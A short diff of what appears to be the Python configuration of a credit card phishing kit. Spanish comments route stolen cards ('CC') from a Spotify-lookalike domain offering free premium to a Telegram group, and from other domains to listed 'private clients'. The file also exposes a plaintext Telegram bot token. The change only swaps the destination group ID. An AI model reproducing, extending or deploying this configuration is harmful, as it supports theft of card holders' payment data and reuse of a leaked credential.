@@ -15,7 +15,7 @@ TELEGRAM_BOT_TOKEN = '8825700631:AAE1L-gbaro7C2TAr4gGMf8P-XUsiyoyleU'
 DOMINIO_GRUPO = 'free.spotlfypremium.online' 
 
 # 2. Pon aquí el ID del grupo donde quieres que caigan las CC de ese dominio
-ID_GRUPO_DESTINO = '-1087968824'
+ID_GRUPO_DESTINO = '-1004493468867'
 
 # 3. Lista de IDs de usuarios normales (para los otros dominios)
 CLIENTES_PRIVADOS = ['6953415010', '7707049896']
